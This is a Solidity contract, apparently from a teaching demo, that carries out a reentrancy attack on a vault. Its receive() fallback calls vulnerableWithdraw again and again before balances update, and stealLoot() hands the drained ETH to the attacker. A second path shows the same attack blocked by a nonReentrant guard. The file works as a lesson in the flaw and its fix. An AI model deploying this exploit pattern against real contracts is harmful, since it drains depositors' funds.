// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

// 定义金库接口，让黑客合约知道怎么调用金库
interface IVault {
    function deposit() external payable;
    function vulnerableWithdraw() external;
    function safeWithdraw() external;
}

// 黑客攻击合约
contract GoldThief {
    
    IVault public targetVault;  // 要攻击的金库
    address public owner;       // 黑客的地址
    uint public attackCount;    // 记录重入了几次
    bool public attackingSafe;  // 是否在攻击安全版本

    // 部署时传入要攻击的金库地址
    constructor(address _vaultAddress) {
        targetVault = IVault(_vaultAddress);
        owner = msg.sender;
    }

    // ❌ 攻击有漏洞的取款函数
    function attackVulnerable() external payable {
        require(msg.sender == owner, "Only owner");
        require(msg.value >= 1 ether, "Need at least 1 ETH to attack");
        
        attackingSafe = false;  // 标记：攻击有漏洞的版本
        attackCount = 0;        // 重置攻击次数
        
        targetVault.deposit{value: msg.value}();  // 先存1ETH进金库
        targetVault.vulnerableWithdraw();          // 开始攻击！
        // 取款时会触发receive函数
        // receive函数会反复调用vulnerableWithdraw
    }

    // 尝试攻击安全版本（会失败）
    function attackSafe() external payable {
        require(msg.sender == owner, "Only owner");
        require(msg.value >= 1 ether, "Need at least 1 ETH");
        
        attackingSafe = true;  // 标记：攻击安全版本
        attackCount = 0;
        
        targetVault.deposit{value: msg.value}();  // 存1ETH
        targetVault.safeWithdraw();                // 尝试攻击
        // 会被nonReentrant拒绝！
    }

    // 重入攻击的核心！
    // 每次收到ETH时自动触发
    receive() external payable {
        attackCount++;  // 记录重入次数
        
        // 攻击有漏洞的版本
        if (!attackingSafe &&                           // 不是攻击安全版本
            address(targetVault).balance >= 1 ether && // 金库还有钱
            attackCount < 5) {                          // 最多重入5次
            targetVault.vulnerableWithdraw();           // 再次取款！
            // 余额还没更新 → 可以一直取！
        }
        
        // 尝试攻击安全版本
        if (attackingSafe) {
            targetVault.safeWithdraw();
            // 会报错："Reentrant call blocked"
            // 因为nonReentrant锁住了！✅
        }
    }

    // 把偷来的ETH转给黑客
    function stealLoot() external {
        require(msg.sender == owner, "Only owner");
        payable(owner).transfer(address(this).balance);
    }

    // 查看黑客合约里有多少ETH
    function getBalance() external view returns (uint256) {
        return address(this).balance;
    }
}
